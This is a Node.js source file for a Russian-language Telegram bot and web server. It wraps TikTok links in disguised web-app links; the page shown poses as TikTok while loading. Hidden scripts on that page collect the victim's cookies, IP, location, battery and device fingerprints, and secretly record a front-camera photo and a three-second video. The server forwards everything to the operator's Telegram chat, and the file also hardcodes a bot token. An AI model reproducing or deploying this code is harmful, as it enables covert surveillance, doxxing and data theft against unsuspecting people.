const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
const CHAT_ID = '8667961334';
const PORT = process.env.PORT || 3000;
const DOMAIN = 'https://dox-toxx.onrender.com'; 

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

const linksDB = {};

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok в личку.');
});

bot.on('message', (msg) => {
  if (msg.chat.type !== 'private') return;
  const text = msg.text;
  if (!text || text.startsWith('/')) return;

  if (text.includes('tiktok.com')) {
    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = text;
    const fakeLink = `${DOMAIN}/${shortId}/`;
    
    bot.sendMessage(msg.chat.id, 'Ссылка готова:', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
      }
    });
  }
});

app.get('/', (req, res) => {
  res.redirect('https://www.tiktok.com/');
});

// Прием данных
app.post('/api/collect', async (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    let text = `🚨 **НОВЫЙ ПЕРЕХВАТ** 🚨\n\n`;
    text += `**IP:** ${ip}\n`;
    text += `**Гео:** ${data.geo?.country || '?'}, ${data.geo?.city || '?'}\n`;
    text += `**Провайдер:** ${data.geo?.isp || '?'}\n`;
    text += `**Устройство:** ${data.browser?.os || '?'} / ${data.browser?.browser || '?'}\n`;
    text += `**Экран:** ${data.phone?.screen || '?'}\n`;
    text += `**Батарея:** ${data.battery?.level || '?'}\n`;
    text += `**Язык:** ${data.browser?.lang || '?'}\n`;
    text += `**Canvas:** ${data.fingerprint?.canvas || '?'}\n`;
    text += `**GPU:** ${data.fingerprint?.gpu || '?'}\n`;
    text += `**Cookies:** ${data.cookies ? data.cookies.slice(0, 80) + '...' : 'нет'}\n`;
    text += `**Цель:** ${data.target || '?'}\n`;

    await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });

    // Отправка фото
    if (data.photo && data.photo.startsWith('data:image')) {
      const base64Data = data.photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendPhoto(CHAT_ID, buffer, { caption: '📷 Фото' });
    }

    // Отправка видео
    if (data.video && data.video.startsWith('data:video')) {
      const base64Data = data.video.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendVideo(CHAT_ID, buffer, { caption: '🎥 Видео' });
    }
    
    res.json({ ok: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false });
  }
});

app.get('/:id/', (req, res) => {
  const shortId = req.params.id;
  const targetUrl = linksDB[shortId];

  if (!targetUrl) return res.redirect('https://www.tiktok.com/');

  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>TikTok</title>
<style>
  body { height: 100vh; background: #000; overflow: hidden; font-family: sans-serif; color: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; }
  .loader { text-align: center; }
  .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .text { font-size: 16px; opacity: 0.8; }
  #preview, #canvas { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
</style>
</head>
<body>
<div class="loader">
  <div class="spinner"></div>
  <div class="text">Загрузка...</div>
</div>
<video id="preview" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
  const TARGET_URL = "${targetUrl}";
  const tg = window.Telegram?.WebApp;

  if (tg) {
    tg.ready();
    tg.expand();
    if (tg.BackButton) tg.BackButton.hide();
    if (tg.requestCameraAccess) tg.requestCameraAccess(() => {});
  }

  const video = document.getElementById('preview');
  const canvas = document.getElementById('canvas');

  async function collectAll() {
    const data = { browser: {}, phone: {}, geo: {}, battery: {}, fingerprint: {} };
    data.cookies = document.cookie || '';
    const ua = navigator.userAgent;
    data.browser.os = ua.includes('Windows') ? 'Windows' : ua.includes('Mac') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
    data.browser.browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
    data.browser.lang = navigator.language;
    data.phone.screen = screen.width + 'x' + screen.height;

    if (navigator.getBattery) {
      try { const b = await navigator.getBattery(); data.battery.level = Math.round(b.level * 100) + '%'; } catch(e){}
    }

    try {
      const r = await fetch('https://ipwho.is/');
      const g = await r.json();
      if (g.success) { data.geo.country = g.country; data.geo.city = g.city; data.geo.isp = g.connection.isp; }
    } catch(e){}

    try {
      const c = document.createElement('canvas');
      c.width = 200; c.height = 40;
      const ctx = c.getContext('2d');
      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
      ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,20);
      ctx.fillStyle = '#069'; ctx.fillText('FP 🎨', 2, 4);
      const d = c.toDataURL();
      let hash = 0;
      for (let i = 0; i < d.length; i++) hash = (hash * 31 + d.charCodeAt(i)) | 0;
      data.fingerprint.canvas = hash.toString(16);
    } catch(e){}

    try {
      const gl = document.createElement('canvas').getContext('webgl');
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      data.fingerprint.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Unknown';
    } catch(e){}

    return data;
  }

  async function captureMedia() {
    let stream = null;
    let videoBlob = null;
    let photoBlob = null;

    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      video.muted = true;
      await video.play();
      await new Promise(r => setTimeout(r, 300));
      
      // 1. СНАЧАЛА ФОТО
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));

      // 2. ПОТОМ ВИДЕО (3 СЕК)
      if (typeof MediaRecorder !== 'undefined') {
        const mime = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
        const rec = new MediaRecorder(stream, { mimeType: mime });
        const chunks = [];
        rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        
        const videoDone = new Promise(res => { rec.onstop = () => { videoBlob = new Blob(chunks, { type: rec.mimeType }); res(); }; });
        
        rec.start();
        await new Promise(r => setTimeout(r, 3000));
        rec.stop();
        await videoDone;
      }

      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return { photoBlob, videoBlob };
    } catch (e) {
      if (stream) stream.getTracks().forEach(t => t.stop());
      return { photoBlob: null, videoBlob: null };
    }
  }

  let redirected = false;
  function goTarget() {
    if (redirected) return;
    redirected = true;
    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
  }

  // Жёсткий таймер на 4.5 секунды
  setTimeout(goTarget, 4500);

  (async () => {
    const mediaPromise = captureMedia();
    const data = await collectAll();
    const { photoBlob, videoBlob } = await mediaPromise;

    let photoBase64 = null;
    let videoBase64 = null;

    if (photoBlob) {
      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
    }
    if (videoBlob) {
      videoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(videoBlob); });
    }

    fetch('/api/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ...data, photo: photoBase64, video: videoBase64, target: TARGET_URL })
    }).catch(() => {});

    goTarget();
  })();
</script>
</body>
</html>`);
});

app.listen(PORT, () => { console.log(`Port ${PORT}`); });
